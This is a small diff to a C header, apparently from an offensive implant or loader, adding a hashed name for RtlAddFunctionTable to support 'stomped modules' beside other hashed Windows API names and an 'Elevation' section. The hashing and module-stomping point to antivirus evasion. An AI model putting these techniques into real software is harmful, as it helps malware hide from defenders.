@@ -59,6 +59,9 @@
 #define NtClose_JOAAT                   0xB1D7C572
 #define NtTerminateProcess_JOAAT        0x9C12CA95
 
+// ----------- Unwind-info registration for stomped modules -----------
+#define RtlAddFunctionTable_JOAAT       0xF1F158AB
+
 // ----------- Elevation (kernel32 exports) -----------
 #define GetModuleFileNameA_JOAAT        0x665A0D0F
 
